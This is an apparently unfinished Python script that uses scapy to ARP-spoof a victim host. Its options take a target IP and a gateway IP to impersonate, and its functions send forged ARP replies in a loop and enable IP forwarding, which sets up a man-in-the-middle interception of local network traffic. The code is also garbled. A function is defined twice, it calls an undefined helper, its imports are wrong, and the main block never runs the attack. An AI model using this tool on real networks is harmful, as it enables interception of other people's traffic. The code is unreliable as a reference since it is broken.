import sys, scapy, time, os, socket
from scapy import *
from argparse import ArgumentParser
from os import geteuid
from uuid import getnode as get_mac

def enable_forwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#count is how many packets to count
#filename is assumed to be valid
#returns 1 when done

def arp_spoof(victimIp,victimMac, srcIp):
	pkt = ARP()
	pkt.op= 'is at'
	pkt.pdst = victimIp
	pkt.hwdst = victimMac
	pkt.src = srcIp
	sendp(pkt,loop = 1)
def arp_spoof(victimIp, victimMac, iface):
	pkt = ARP()
	pkt.op= 2
	pkt.pdst=victimIp
	pkt.hwdst=victimMac
	pkt.src= socket.gethostbyname(socket.gethostname())
	pkt.hwsrc = get_host_mac()
	sendp(pkt,iface=iface, loop = 1)

def getmac(interface):
  try:
    mac = open('/sys/class/net/'+interface+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]
#calls function arp_monitor_callback
if __name__ == "__main__":
	if not geteuid() == 0:
		exit("[-] Rerun with root access")
	#enable_forwarding()
	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
	parser.add_argument('-i', required=True, help= 'Set interface')
	parser.add_argument('-t', '--targetIp', required=True, help= 'Set Victim Ip Address')
	parser.add_argument('-g', '--gatewayIp',required=True,help= 'Set ip you want to impersonate')
	args = parser.parse_args()



